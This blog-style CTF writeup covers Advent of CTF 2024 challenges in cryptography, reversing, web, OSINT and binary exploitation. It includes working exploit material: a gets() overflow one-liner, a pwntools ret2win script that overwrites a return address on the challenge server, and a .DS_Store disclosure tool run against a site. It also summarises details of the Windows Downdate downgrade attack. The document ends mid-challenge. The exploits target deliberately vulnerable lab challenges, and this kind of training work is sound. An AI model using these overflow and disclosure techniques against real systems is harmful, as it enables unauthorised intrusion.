# 📝 Advent of CTF 2024 Writeups

---

## 📝 Full Writeup

Advent of CTF 2024 Writeups![Rusty

](/web/20251127170506/)

[Rusty](/web/20251127170506/)

·
Jan 1, 2025

--

2

Hey everyone, It’s been a while since I’ve done CTF writeups. The [Cyberstudents](https://cyberstudents.net/) community decided to organize a month-long CTF in December. As a CTF nerd, I just had to participate (this is my second month-long CTF in 2024).

I solved quite a few challenges and decided to do writeups for them. So here we go.

### Day 1: Logical Exclusivity
> 
**Category: **Cryptography
**Points: **30
**Author: **thee2d

rotten bxgxnnxngs

64 6e 63 74 7f 4c 7a 37 7b 3c 50 37 3c 36 3e 59 79 3e 59 36 3a 50 37 3a 37 43 3b 37 72

**Hint 1:** Logical exclusivity = a logical operator?
**Hint 2:** CyberChef is your friend. Check out some brute forcing tools!

I’ve spent way too much time on this one than I should’ve. Admittedly, it was a bit guessy. So you’re given a hex string which you can easily decode to ASCII. That was straightforward. But what came after that was what kept me awake for hours looking at my screen.

Turns out, you have to use the XOR Bruteforce recipe on CyberChef first. Looking through all the different strings, you’ll find one that looks like this:

```
Key = 0f: kal{pCu8t3_8391Vv1V95_858L48}
```

That looks quite similar to our flag format. Going back to the challenge description, we see the word **rotten**, which reminds you of ROT. Now, I was a bit confused because the **ten** part of **rotten** could mean ROT10. But that was not the case.

Using the ROT13 Brute Force tool in CyberChef, I got the flag from that string at amount 18.

```
Amount = 18: csd{hUm8l3_8391Nn1N95_858D48}
```

Flag: csd{hUm8l3_8391Nn1N95_858D48}

### Day 2: screaming
> 
**Category: **Reverse engineering
**Points: 40Author: **qvipin

AAAAA- I’m not screaming, I’m just buffer overflowing my emotions!

**Hint 1:** Try decompiling it, dogbolt.org is good for that.
**Hint 2:** Look at the buffer amount in the decompilations from dogbolt, try overflowing it by sending more than the buffer.

Let’s start with the static analysis of the given binary file. Running `file` on it, we can see:

It’s a 64-bit ELF file, dynamically linked, and not stripped. Not being stripped, we can see the symbol names of the program. Now let’s see what protections it has using `checksec`.

Looks like, it has all kinds of protections turned on. Running the program, it asks for your input. No matter what I input, I get “not that easy pal :|”. Let’s decompile the file.

We find the main function

```
undefined8 main(void)

{
 long in_FS_OFFSET;
 char local_1ff8 [8166];
 char local_12;
 long local_10;
 
 local_10 = *(long *)(in_FS_OFFSET + 0x28);
 local_12 = '\0';
 gets(local_1ff8);
 if (local_12 == '\0') {
 puts("not that easy pal :| ");
 }
 else {
 win();
 }
 if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
 /* WARNING: Subroutine does not return */
 __stack_chk_fail();
 }
 return 0;
}
```

It uses the notorious gets() function to take a user input. After that, it compares a value (‘`\0`’, which is the null terminator) to the `local_12` variable. If it matches, then we get the printed output we were getting. Otherwise, it will jump to the `win()` function. Let’s check out the `win()` function then.

```
void win(void)

{
 size_t sVar1;
 long in_FS_OFFSET;
 int local_3c;
 undefined8 local_38;
 undefined8 local_30;
 undefined4 local_28;
 long local_20;
 
 local_20 = *(long *)(in_FS_OFFSET + 0x28);
 local_38 = 0xf5d39eced1ced9c9;
 local_30 = 0xf5d8f5dd9ae2f598;
 local_28 = 0xd795df;
 local_3c = 0;
 while( true ) {
 sVar1 = strlen((char *)&local_38);
 if (sVar1 <= (ulong)(long)local_3c) break;
 *(byte *)((long)&local_38 + (long)local_3c) = *(byte *)((long)&local_38 + (long)local_3c) ^ 0xaa
 ;
 local_3c = local_3c + 1;
 }
 printf("Day 2 gotta keep it simple :) Here is the flag: %s\n",&local_38);
 if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
 /* WARNING: Subroutine does not return */
 __stack_chk_fail();
 }
 return;
}
```

As you can see, the function does some calculations on the `local_38` variable and then prints its value as the flag. As long as we can execute the `win()` function, we can get our flag.

So, here’s the plan:

- We can take advantage of the vulnerable gets() function to cause a buffer overflow, override the value of the local_12 variable, and jump to the win() function to get the flag.

- We can also patch the given binary, and change the value of the local_12 variable ourselves, and the rest remains the same.

- Do the calculations in the win() function to decrypt the flag.

Let’s look at the first approach. Generate a payload of 8166 characters, add a random value other than `\0` to it, and supply it to the program. Here’s the Python one-liner:

```
python3 -c 'print("A" * 8166 + "\x01")' | ./chall
```

In the second approach, you can patch the value of the `local_12` variable using any decompiler. I’ve used Ghidra. After changing the value, it looks like this:

Save the patched binary and run it. That will give you the flag.

In the 3rd and final approach, we can simulate the operations in the win() function to get the flag. Basically, each byte of the local_38 variable (encrypted flag) is being XOR’ed with 0xaa to get back the flag. So we can just do the XOR ourself and print the value. I used this Python script:

```
# Encoded flag

encoded_flag = [
 0xc9, 0xd9, 0xce, 0xd1, 0xce, 0x9e, 0xd3, 0xf5,
 0x98, 0xf5, 0xe2, 0x9a, 0xdd, 0xf5, 0xd8, 0xf5, 
 0xdf, 0x95, 0xd7
]

# XOR each byte with 0xaa to decode
decoded_flag = ''.join(chr(byte ^ 0xaa) for byte in encoded_flag)
print("Decoded flag:", decoded_flag)
```

Notice the bytes are written in reverse order than what we saw on the decompiled code. This is done to preserve the little-endianness. Running the code will give you the flag.

Flag: csd{d4y_2_H0w_r_u?}

### Day 3: **ElfTV**
> 
**Category: **Reverse engineering
**Points: 55Author: **qvipin

Santa’s ElfTV license key checker got leaked! Finally, a break for a broke elf like you, starving for that sweet, sweet elf dopamine. The catch? You’ve got to reverse-engineer Santa’s “state-of-the-art” security to unlock it. Think you’re smarter than the guy who still uses reindeer for transportation? Prove it and claim your ElfTV fix!!!!

Connect using `nc ctf.csd.lol 1001`

**Hint 1:** Look closely at each function. How does it contribute to validating the key?
**Hint 2:** The Fibonacci sequence is used in the key validation, but it doesn’t behave as the Elves expected. Examine the function and figure out why it isn’t producing the standard Fibonacci numbers.

We’re given a Rust program:

```
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::path::Path;

fn supasecurefibberdachicheckerthing(n: usize) -> Vec<u64> {
 let mut fib: Vec<u64> = vec![0, 1];
 for i in 2..n {
 let next = fib[i - 1].checked_add(fib[i - 2]).unwrap_or(0);
 fib.push(next);
 }
 fib
}

fn validate_license_key(key: &str) -> bool {
 if !key.starts_with("XMAS") {
 return false;
 }

 if key.len() != 12 {
 return false;
 }

 let ascii_sum: u32 = key.chars().skip(4).take(5).map(|c| c as u32).sum();
 if ascii_sum != 610 {
 return false;
 }

 let fib_482 = supasecurefibberdachicheckerthing(483)[482];
 let fib_last_3 = fib_482 % 1000;

 let key_last_3: u16 = match key[9..12].parse() {
 Ok(num) => num,
 Err(_) => return false,
 };

 if key_last_3 != fib_last_3 as u16 {
 return false;
 }

 true
}

fn win() {
 let flag_path = Path::new("flag.txt");

 if let Ok(file) = File::open(flag_path) {
 let mut buf_reader = io::BufReader::new(file);
 let mut flag = String::new();
 if buf_reader.read_line(&mut flag).is_ok() {
 println!("🎄 Ho Ho Ho!, go watch some ELFTV!: {}", flag.trim());
 } else {
 println!("smth went wrong contact vip3r with error (flag-file-1)");
 }
 } else {
 println!("smth went wrong contact vip3r with error (flag-file-2)");
 }
}

fn main() {
 println!("🎄 Welcome to the ElfTV XMAS-license key checker!");
 println!("Please enter your license key:");

 let stdin = io::stdin();
 let mut input = String::new();
 let mut stdout = io::stdout();

 if stdin.read_line(&mut input).is_ok() {
 let key = input.trim();
 if validate_license_key(key) {
 win();
 } else {
 writeln!(stdout, "Ho ho ho! Try again.").unwrap();
 }
 } else {
 writeln!(stdout, "Failed to read the input!").unwrap();
 }
}
```

It’s a license checker program where your given input goes through some conditions. If all of them are met, you get the flag. So, let’s take a quick look at the conditions:

- The key must start with `"XMAS"`.

- The key length needs to be 12.

- The ASCII value sum of the 5 consecutive characters after the 4th character (so, 5th 50 9th) needs to be 610

- The last 3 characters of the key (`key[9..12]`) must match the **last 3 digits** of `fib_482` , which is supposed to be the 482nd fibonacci number.

The first 3 conditions are really easy to meet. Start the key with **XMAS**. Fill up the next 5 characters whose ASCII value adds up to 610. For me, I chose these characters: }}}}n

125 * 5 + 110 = 610. Our key so far is **XMAS}}}}n**. Then came the real challenge.

If you calculate the 482nd Fibonacci number, you get: 24130015357889614840807962620028350479216011277190196743261610776878424511662841261217058994930287041

The last 3 digits are 041. Then the key should be **XMAS}}}}n041**, right? Nope! This is where many of us got stuck. Since I don’t know Rust, I couldn’t confirm the code either.

So I went to a debugger, ran the program, and used print statements to print the Fibonacci number that the program calculates.

Interesting. So the number being generated is different than what I expected. Anyway, we have the final piece of the key. The key is **XMAS}}}}n738**.

The last step is to connect to the remote server and submit the key to get the flag.

Flag: csd{Ru57y_L1c3N53_k3Y_CH3Ck3r}

### Day 6: **Epochrypt**
> 
**Category: **Cryptography
**Points: 7**0
**Author: **qvipin

It’s time to test out Tibel Elf’s new encryption method. He says once you encrypt it, you can’t unencrypt it. Sureeee… Connect with `nc ctf.csd.lol 3551`.

**Hint1:** Tibel Elf thinks since we can’t go back in time we can’t reverse the encryption… How does the encryption utilize time to encrypt?
**Hint 2:** It seems to use epoch with XOR. What if we guess what epoch time it is XORing the string? Python may help script a solution.

We’re given a Python code that shows how the flag is being encrypted.

```
#!/usr/local/bin/python
import time
import base64 as b64
from pwn import xor

def epochrypt(enc):
 bits = bytes([(b + 3) % 256 for b in enc])
 based = b64.b64encode(bits)
 epc = str(int(time.time())).encode()
 final = xor(based, epc)
 print(final.hex())

def menupage():
 print("Epochrypt v1.0")
 print("\"The Dynamic Encryption Method\"")
 print("------------------------------------")
 print("1. Encrypt Text")
 print("2. View Encrypted Flag")
 print("3. Check Flag")
 print("4. Exit Program")

try:
 while True:
 menupage()
 option = input("Enter option here: ")
 if option == "1":
 textToEncrypt = input("Enter String: ")
 epochrypt(textToEncrypt.encode())
 exit(0)
 if option == "2":
 with open("/app/flag.txt", "rb") as file:
 flag = file.read()
 epochrypt(flag)
 exit(0)
 if option == "3":
 checkFlag = input("Enter flag here to check: ")
 with open("/app/flag.txt", "rb") as file:
 flag = file.read()
 if flag in (checkFlag + "\n").encode():
 print("Correct! You got it, now go submit that thang.")
 exit(0)
 else:
 print("*BUZZ* That ain't it bud :(")
 exit(0)
 if option == "4":
 print("bye bye!")
 exit(0)

except KeyboardInterrupt:
 print("CTRL + C detected, Quitting program...")
```

First, let’s understand how the encryption is happening.

- Each byte in the input (`enc`) is incremented by 3 and wrapped modulo 256.

- The resulting bytes are base64 encoded.

- The current epoch time (in seconds) is converted to a string and XORed with the base64-encoded result.

From the menu options, you can see that option 2 lets you see the flag after being encrypted.

Now, all 3 of the encryption schemes are reversible. So we can take the hash value, reverse the encryption schemes to get back the flag.

Of course, the epoch time is an important consideration here. However, you can increment and decrement the time a little bit (in my case, 60 seconds) to get nearby possible values. Here’s the Python script:

```
import time
import base64 as b64
from pwn import xor

# Given encrypted flag (hex string) (this can and will vary from time to time)
encrypted_flag_hex = "6b59695b575e5406676d7f5e6671555d79597d0e57707a0664647e06560b5c7677640c0e"

# Step 1: Convert hex string to bytes
encrypted_flag = bytes.fromhex(encrypted_flag_hex)

# Step 2: Brute-force the epoch time
current_epoch = int(time.time()) # Current epoch time
start_epoch = current_epoch - 60 # Assume encryption happened within the last 60 seconds
end_epoch = current_epoch + 60 # Account for slight time drift

for epoch_guess in range(start_epoch, end_epoch):
 # Convert epoch guess to bytes
 epoch_bytes = str(epoch_guess).encode()

 # Step 3: XOR the encrypted flag with the epoch bytes
 base64_encoded = xor(encrypted_flag, epoch_bytes)

 try:
 # Step 4: Decode the Base64-encoded data
 byte_manipulated = b64.b64decode(base64_encoded)

 # Step 5: Reverse the byte manipulation
 original_flag = bytes([(b - 3) % 256 for b in byte_manipulated])

 # Print the results
 # print(f"Epoch Guess: {epoch_guess}")
 print(f"Decoded Flag: {original_flag.decode()}")
 except Exception:
 # If decoding fails, continue to the next guess
 continue
```

Running the script, I got multiple candidates. Out of them, one looked promising.

Now, I could go back to the program and test the flag using option 3. But I was too lazy. So I just submitted it.

Flag: csd{d3F0_M4d3_8y_4N_3lf}

### Day 8: **Apple Fanatic**
> 
**Category: **Web exploitation
**Points: 60Author: **thee2d

<REDACTED FOR BREVITY>

A member of the secret society dropped a note in Santa’s presents sack overnight. Somehow, they got past our sleeping elf watching the security cameras. Thankfully, the person didn’t seem to know [OPSEC](https://en.wikipedia.org/wiki/Operations_security) and included their personal website on the note. The note read:

We will be watching you.
- The Secret Society of K.U.N.A.L
[https://apple-fanatic.csd.lol/](https://apple-fanatic.csd.lol/)

The only thing they’ve taken with them is an apple from the sack of presents. Weird.

Our top SOC elves gathered two pieces of information from their initial observation of the site:

1. This person seems to like apples. Like, a lot.

2. The person claims a flag is intricately hidden on the site under a name that no one will be able to guess.

**Hint 1:** This person probably made their website on macOS. Do you know anything special macOS has but Windows or Linux doesn’t? Could it be something that could be accessed through the website unbeknownst to the website’s author? Check out your browser’s DevTools, if you haven’t already. See if there’s anything weird in the “Elements” or “Sources” tab (for Chrome DevTools).
**Hint 2:** Try creating a folder on macOS. Sometimes, a special *hidden* file appears.

From the description and hints, it’s safe to assume that the hidden folder being talked about here is `[.DS_Store](https://en.wikipedia.org/wiki/.DS_Store)`. It’s a macOS-exclusive folder you won’t find in other operating systems.

Checking the source code, I noticed that there’s a secret directory on the site: /my-secret-vault-of-scripts-n-files.

But you can’t visit it. With my assumption though, I tried to download the `.DS_Store` file.

```
wget https://apple-fanatic.csd.lol/my-secret-vault-of-scripts-n-files/.DS_Store
```

Nice, as expected, we got a hold of the `.DS_Store` file. But now what? I started searching for tools that could deal with this file. Soon enough, I [found a tool](https://github.com/lijiejie/ds_store_exp) that extracts the contents from these files directly from the web.

First, set up the tool.

```
pip install ds-store requests
```

Download the `ds_store_exp.py` file from the GitHub repository. Then run:

```
python ds_store_exp.py https://apple-fanatic.csd.lol/my-secret-vault-of-scripts-n-files/.DS_Store
```

This downloaded a folder on my system. It had a file named `the-birth-date-of-my-beloved-apple-tree.txt`. Interesting. Inside that file was the flag.

You can learn more about `.DS_Store` file in [this blog post](https://0day.work/parsing-the-ds_store-file-format/).

Flag: csd{5H3_w45_80RN_0N_7H3_d4y_0f_Chr157M4Z}

### Day 8: vuln research
> 
**Category: **OSINT
**Points: 45Author: **qvipin

Santa needs your help to investigate the Downdate vulnerability! He has a few urgent questions about it that he needs answered ASAP. Can you provide the answers to help keep the North Pole safe from these threats?

1. What is the surname of the researcher who discovered the Downdate vulnerability.

2. Which technology company is responsible for addressing the Downdate vulnerability?

3. What is the CVE identifier associated with the Windows Downdate vulnerability?

4. Which registry key is manipulated to disable Virtualization-Based Security (VBS) in the Windows Downdate exploit?

5. What is the name of the XML file that the Windows Downdate exploit manipulates to control the update process?

Which Windows kernel module is downgraded in the Windows Downdate proof-of-concept to exploit the “ItsNotASecurityBoundary” vulnerability?

Answer the questions with a single word @ `nc ctf.csd.lol 5000`

**Hint 1:** Use credible sources like CVE databases (e.g., NVD), security blogs, and announcements from technology companies. These provide a lot of information about the vulnerability.
**Hint 2:** Google will be your best friend; try searching up some of the specific words the questions are asking.

With a bit of Googling different sites, you can get your hands on all the answers (Ctrl+F is useful if you don’t like reading, and yes, some of them were a bit guessy).

- [Leviev](https://www.safebreach.com/blog/downgrade-attacks-using-windows-updates/)

- [Microsoft](https://www.safebreach.com/blog/downgrade-attacks-using-windows-updates/)

- [CVE-2024–21302](https://www.kaspersky.com/blog/windows-downgrade-downdate-protection/52005/)

- [EnableVirtualizationBasedSecurity](https://www.safebreach.com/blog/update-on-windows-downdate-downgrade-attacks/)

- [pending.xml](https://www.kaspersky.com/blog/windows-downgrade-downdate-protection/52005/)

- [ci.dll](https://www.safebreach.com/blog/downgrade-attacks-using-windows-updates/)

If you’re like me and want to automate things, you can also create a Python script:

```
from pwn import *

io = remote('ctf.csd.lol', 5000)

answers = {'1': 'Leviev', '2': 'Microsoft', '3': 'CVE-2024-21302',
 '4': 'EnableVirtualizationBasedSecurity', '5': 'pending.xml', '6': 'ci.dll'}

for i in range(6):
 question = io.recvuntil(f'{list(answers.keys())[i]}: '.encode())
 print(question, end='')
 answer = list(answers.values())[i]
 print(answer)
 io.sendline(answer.encode())
 print(io.recvline())

flag = io.recvall().decode()
print(flag)
```

Once you give the correct answers, you’ll get the flag.

Flag: csd{d0wNda73_15_W31RD}

### Day 9: **resa?**
> 
**Category: **Cryptography
**Points: 80Author: **qvipin

Elf Theodred: Hey, I’m testing out a new… *<yap yap yap>*

You: What? You lost me at “Hey, I’m testing.”

Elf Theodred: What I *said* was, I encrypted… *<yap yap yap>* and missing `q`.

You: Resa? Vesa? Are we talking about monitors or cybersecurity? And what’s this about a missing `e` and `q`? Is that supposed to be a type of screw? Huh?

Elf Theodred: I’m not repeating myself to an intern. Figure it out, bud. And if you heard a word I said, it’s under 50.

**Hint 1:** Elf Theodread was talking about RSA! To decrypt RSA, you need a `P`, `Q`, `E`, and `C`, but we are missing the `E` and `Q`. How do we know what the `E` is though? How do we get Q? Did Elf Theodred say something?
**Hint 2:** Ok, the E is supposedly under 50 and must be a valid coprime number. Also, n = p*q which means we can just divide to get `Q` That should be narrowing enough for us to solve!

From the challenge name itself, we know it’s an RSA problem. We’re also given a file that contains some values.

```
n=14796477939003611775208041290348339020936676002454717224646251311708293201469184897483873509941865693809473126459329421641681364023167948749968330703736720102973359063469333188059740821023029754734348790951000190344725434181826714146206341535759458897968330526467533482043059528899390103382667493810391462225262830839080650123020531330437922519352683752900562956790917167821286707566070945501977829889638290916396721583750493508694371199246172248676755456956867908139894047255712093824958695471469193986023590431653571458714419577768587744910333974014399293363573408883808909700956297360313208260851637982241566005049
c=7834381455537086069556470828674580173937271064256312815617230923582264273260067511896680320170885743343862894164014864043792487985706669274975353978277862462944814782646749746217479200710773218743409525658958249817055354592575831865920206596021699022326281524908299055420849742148757177093582285192053105592180465511200588277457610702671508363048935552446809692594715753573724603294565113603946429767347234628199252177612170759392617992009035004668823723769453952068616628571785811538463850603629779083508146990944772896050051747702814005551146368404685501836088557927084895438654990821206561992369510510301944786242
p=95035264145462998106373959950852388512916398417336694051973007035267892127571038290551358518210018988802168144062568058000141570285306734135476955708641860308084865175837570650537276267265396611644179740194499506782555051319215145789689879081854479885459274078337276115880870922739027746148771680782305865397
```

We are missing a `q` and an `e`. From the description, we can assume that `e` is less than 50. So, we can bruteforce different prime number values for `e`. As for `q`, we can divide `n` by `p` to get that. A simple Python script will help us solve the challenge quickly.

After some trial and error, I found `e` is 11. Here’s the full script:

```
from Crypto.Util.number import long_to_bytes

c=7834381455537086069556470828674580173937271064256312815617230923582264273260067511896680320170885743343862894164014864043792487985706669274975353978277862462944814782646749746217479200710773218743409525658958249817055354592575831865920206596021699022326281524908299055420849742148757177093582285192053105592180465511200588277457610702671508363048935552446809692594715753573724603294565113603946429767347234628199252177612170759392617992009035004668823723769453952068616628571785811538463850603629779083508146990944772896050051747702814005551146368404685501836088557927084895438654990821206561992369510510301944786242

n=14796477939003611775208041290348339020936676002454717224646251311708293201469184897483873509941865693809473126459329421641681364023167948749968330703736720102973359063469333188059740821023029754734348790951000190344725434181826714146206341535759458897968330526467533482043059528899390103382667493810391462225262830839080650123020531330437922519352683752900562956790917167821286707566070945501977829889638290916396721583750493508694371199246172248676755456956867908139894047255712093824958695471469193986023590431653571458714419577768587744910333974014399293363573408883808909700956297360313208260851637982241566005049
p=95035264145462998106373959950852388512916398417336694051973007035267892127571038290551358518210018988802168144062568058000141570285306734135476955708641860308084865175837570650537276267265396611644179740194499506782555051319215145789689879081854479885459274078337276115880870922739027746148771680782305865397

q = n // p

phi = (p-1) * (q-1)

e = 11

d = pow(e, -1, phi)

M = pow(c, d, n)
flag = long_to_bytes(M).decode()

print(flag)
```

You can also use online tools like [dcode.fr](https://www.dcode.fr/rsa-cipher).

Flag: csd{V3sA_R3sa_RSa?_1D3k}

### Day 10: **flag from wish**
> 
**Category: **Binary exploitation
**Points: 90Author: **kolmus

What is on your wish list this year? Be sure to tell Santa in great detail. He might have an early present or two in store for you!

`nc ctf.csd.lol 4003`

**Hint 1:** It appears that an elf has mixed up 100 and 0x100. I guess your wishes might not be as limited as you think. Checking the symbols of the binary (e.g. using nm or a decompiler/disassembler) reveals a ‘win’ function and its address.
**Hint 2:** Try setting the return address mentioned in the debug output, sloppily left by(/in) the elf, to the address of the win function. Be careful about sending the actual bytes, not the address’s character representation.

Let’s start with some static analysis using `file` and `checksec`.

No stack canary. That means we can cause some buffer overflow. Let’s run the program.

It takes a user input and then shows some kind of address. Let’s decompile the binary in Ghidra to analyze it.

Here’s the main function:

```

undefined8 main(void)

{
 ssize_t sVar1;
 undefined8 unaff_retaddr;
 undefined8 local_78;
 undefined8 local_70;
 undefined8 local_68;
 undefined8 local_60;
 undefined8 local_58;
 undefined8 local_50;
 undefined8 local_48;
 undefined8 local_40;
 undefined8 local_38;
 undefined8 local_30;
 undefined8 local_28;
 undefined8 local_20;
 undefined4 local_18;
 int local_c;
 
 puts("enter your wish:");
 fflush(stdout);
 local_78 = 0;
 local_70 = 0;
 local_68 = 0;
 local_60 = 0;
 local_58 = 0;
 local_50 = 0;
 local_48 = 0;
 local_40 = 0;
 local_38 = 0;
 local_30 = 0;
 local_28 = 0;
 local_20 = 0;
 local_18 = 0;
 sVar1 = read(0,&local_78,0x100);
 local_c = (int)sVar1;
 *(undefined *)((long)&local_78 + (long)local_c) = 0;
 puts("hmm ... I\'m not sure I can grant that");
 puts("maybe try again next year.");
 printf("[DEBUG] returning to address: %p\n",unaff_retaddr);
 fflush(stdout);
 return 0;
}

```

The `read()` function reads **256 bytes** of input into the stack buffer `local_78` (which is significantly smaller). This allows you to overwrite data beyond the buffer, including the return address. There’s also a win() function here.

```

undefined8 win(void)

{
 ssize_t sVar1;
 undefined8 uStack_190;
 undefined8 uStack_188;
 undefined8 uStack_180;
 undefined8 uStack_178;
 undefined8 uStack_170;
 undefined8 uStack_168;
 undefined8 uStack_160;
 undefined8 uStack_158;
 undefined8 uStack_150;
 undefined8 uStack_148;
 undefined8 uStack_140;
 undefined8 uStack_138;
 undefined4 uStack_130;
 int iStack_124;
 code *pcStack_120;
 undefined8 local_118;
 undefined8 local_110;
 undefined8 local_108;
 undefined8 local_100;
 undefined8 local_f8;
 undefined8 local_f0;
 undefined8 local_e8;
 undefined8 local_e0;
 undefined8 local_d8;
 undefined8 local_d0;
 undefined8 local_c8;
 undefined8 local_c0;
 undefined8 local_b8;
 undefined8 local_b0;
 undefined8 local_a8;
 undefined8 local_a0;
 undefined8 local_98;
 undefined8 local_90;
 undefined8 local_88;
 undefined8 local_80;
 undefined8 local_78;
 undefined8 local_70;
 undefined8 local_68;
 undefined8 local_60;
 undefined8 local_58;
 undefined8 local_50;
 undefined8 local_48;
 undefined8 local_40;
 undefined8 local_38;
 undefined8 local_30;
 undefined8 local_28;
 undefined8 local_20;
 int local_10;
 int local_c;
 
 pcStack_120 = (code *)0x40121e;
 local_c = open("flag.txt",0);
 local_118 = 0;
 local_110 = 0;
 local_108 = 0;
 local_100 = 0;
 local_f8 = 0;
 local_f0 = 0;
 local_e8 = 0;
 local_e0 = 0;
 local_d8 = 0;
 local_d0 = 0;
 local_c8 = 0;
 local_c0 = 0;
 local_b8 = 0;
 local_b0 = 0;
 local_a8 = 0;
 local_a0 = 0;
 local_98 = 0;
 local_90 = 0;
 local_88 = 0;
 local_80 = 0;
 local_78 = 0;
 local_70 = 0;
 local_68 = 0;
 local_60 = 0;
 local_58 = 0;
 local_50 = 0;
 local_48 = 0;
 local_40 = 0;
 local_38 = 0;
 local_30 = 0;
 local_28 = 0;
 local_20 = 0;
 pcStack_120 = (code *)0x401370;
 sVar1 = read(local_c,&local_118,0x100);
 local_10 = (int)sVar1;
 pcStack_120 = (code *)0x40138d;
 write(1,&local_118,(long)local_10);
 pcStack_120 = main;
 FUN_00401100(0);
 pcStack_120 = (code *)&stack0xfffffffffffffff8;
 puts("enter your wish:");
 fflush(stdout);
 uStack_190 = 0;
 uStack_188 = 0;
 uStack_180 = 0;
 uStack_178 = 0;
 uStack_170 = 0;
 uStack_168 = 0;
 uStack_160 = 0;
 uStack_158 = 0;
 uStack_150 = 0;
 uStack_148 = 0;
 uStack_140 = 0;
 uStack_138 = 0;
 uStack_130 = 0;
 sVar1 = read(0,&uStack_190,0x100);
 iStack_124 = (int)sVar1;
 *(undefined *)((long)&uStack_190 + (long)iStack_124) = 0;
 puts("hmm ... I\'m not sure I can grant that");
 puts("maybe try again next year.");
 printf("[DEBUG] returning to address: %p\n",local_118);
 fflush(stdout);
 return 0;
}

```

The key idea is to perform a **buffer overflow** to overwrite the return address in `main()` with the address of the `win()` function. A typical ret2win challenge.

First, let’s try to find the offset. I’m using Pwndbg for that.

```
pwndbg main
```

After opening the binary, create a cyclic pattern.

```
cyclic 500
<generated pattern>
r
(paste the generated pattern)
```

The program crashes. Let’s look at the offset.

To get the offset, I run:

```
cyclic -l paaaaaaa
```

This should reveal the offset.

The offset is 120. With that knowledge, we can create a Python script.

```
from pwn import *

# Set up the binary
binary = "./main"
elf = ELF(binary)

# Offsets and addresses
offset = 120 # Replace with the correct offset from cyclic_find
win_addr = elf.symbols['win'] # Address of win()

# Payload
payload = b"A" * offset # Padding to overflow buffer
payload += p64(win_addr) # Overwrite return address with win()

# Send the payload
# io = process(binary)
io = remote('ctf.csd.lol', 4003)
io.sendline(payload)
res = io.recv(4096).decode()
print(res)
```

Running this script gives us the flag.

Flag: csd{Br0uGH7_t0_YOU_8y_W15H_D0t_CoM}

### **Day 11: Festive Encoding**
> 
**Category: **Cryptography
**Points: 55Author: **thee2d

“Agent! There you are. I got to take today off, sorry,” said your elf mentor, “it’s fine if I leave you at the office, right? It’s a slow day anyways…”

Your curiosity, of course, led you to Santa’s office. You step into his glacial abode where he is sleeping gracefully. *Actually, he snores pretty loudly.* Maybe, you’ll find some of his secrets about children.

*Should I peak into the unlocked file cabinet?* Your intrusive thoughts won, of course.

You take out a document, only to find it scattered with emojis. Perhaps, Santa wants to better relate to the children of Generation Alpha? *He should’ve used words like rizz, Diddy, and fein instead.*

“That’s Festive Encoding, agent,” muttered Santa behind you.

Try decoding the excerpt under “2024 Encoded” in the file to reveal the flag. Once you do, probably use it for blackmail before you get fired.

**Hint 1:** Take a look at the encoded/decoded text for 2023 — can you find the relationship between the letters and the emojis? Do the same letters have the same emojis? What could that mean? The 2024 encoded version looks similar too. Maybe they’re related?
**Hint 2:** You can create a map, where each letter maps to an emoji, by using the 2023 encoded/decoded text. Now, try using your map. Substitute all the emojis you found in the map with the respective letter. You’ll find that there may be a few letters missing. Don’t worry — the flag doesn’t really make sense. They’re all English words, though. However, you probably have a better chance at guessing the words scattered around the message instead.

You’re given a TXT file containing this:

```
---- 2023 DECODED ----
DEAR CHILD,

YOU DID THE DAILY CTF!!!

I'M SO PROUD OF YOU.

SOMEONE MAY CONTACT YOU SOON.

FOR MANDATORY EMPLOYMENT AT THE NORTH POLE.

A ONE DOLLAR PER CHRISTMAS. FULL-TIME.

MERRY CHRISTMAS!

SANTA
---- 2023 DECODED ----

---- 2023 ENCODED ----
🦌🔔🎅🎳 🎁❄️⛄🎶🦌,

🎤🎮🎨 🦌⛄🦌 🎭❄️🔔 🦌🎅⛄🎶🎤 🎁🎭🕯️!!!

⛄'🎵 🎰🎮 🎲🎳🎮🎨🦌 🎮🕯️ 🎤🎮🎨.

🎰🎮🎵🔔🎮🎸🔔 🎵🎅🎤 🎁🎮🎸🎭🎅🎁🎭 🎤🎮🎨 🎰🎮🎮🎸.

🕯️🎮🎳 🎵🎅🎸🦌🎅🎭🎮🎳🎤 🔔🎵🎲🎶🎮🎤🎵🔔🎸🎭 🎅🎭 🎭❄️🔔 🎸🎮🎳🎭❄️ 🎲🎮🎶🔔.

🎅 🎮🎸🔔 🦌🎮🎶🎶🎅🎳 🎲🔔🎳 🎁❄️🎳⛄🎰🎭🎵🎅🎰. 🕯️🎨🎶🎶-🎭⛄🎵🔔.

🎵🔔🎳🎳🎤 🎁❄️🎳⛄🎰🎭🎵🎅🎰!
---- 2023 ENCODED ----

---- 2024 ENCODED ----
🦌🔔🎅🎳 🎁❄️⛄🎶🦌,

⛄ 🎰🔔🔔 🎤🎮🎨 🦌⛄🦌🎸'🎭 🦌🎮 🎭❄️🔔 🦌🎅⛄🎶🎤 🎁🎭🕯️, 🎊⛄🦌.

🎥🔔🎶🎶, 🎤🎮🎨 🎊🎸🎮🎥 🎥❄️🎅🎭 ❄️🎅🎲🎲🔔🎸🎰 🎸🎮🎥.

🎤🎮🎨 🎰🔔🔔 🎭❄️🎅🎭 🎲🔔🎳🎰🎮🎸 🎮🎨🎭🎰⛄🦌🔔 🎮🕯️ 🎤🎮🎨🎳 🎥⛄🎸🦌🎮🎥?

⛄🎸 🎭❄️🔔 🎥❄️⛄🎭🔔 🎬🎅🎸 🎥⛄🎭❄️ 🎭❄️🔔 🕯️🎳🔔🔔 🎁🎅🎸🦌🎤 🎰⛄🎉🎸?

⛄ ❄️🎅🦌 🎰🎮🎵🔔 🎶🔔🕯️🎭🎮🎬🔔🎳🎰 🕯️🎳🎮🎵 🎁❄️🎳⛄🎰🎭🎵🎅🎰 🎶🎅🎰🎭 🎤🔔🎅🎳.

🎭❄️🔔🎳🔔 🎥🔔🎳🔔 🎭🎮🎸🎰 🎮🕯️ 🎁❄️⛄🎶🦌🎳🔔🎸 🎥❄️🎮 🎲⛄🎁🎊🔔🦌 🎭❄️🔔 🎮🎭❄️🔔🎳 🎮🎲🎭⛄🎮🎸...

🎄🎨🎭 🎄🔔🕯️🎮🎳🔔 🎤🎮🎨 🎉🔔🎭 ⛄🎸, ⛄ 🎵🎨🎰🎭 🎅🎰🎊:

🎅 🕯️🎶🎅🎉 🎮🎳 🎤🎮🎨🎳 🕯️🎅🎵⛄🎶🎤?

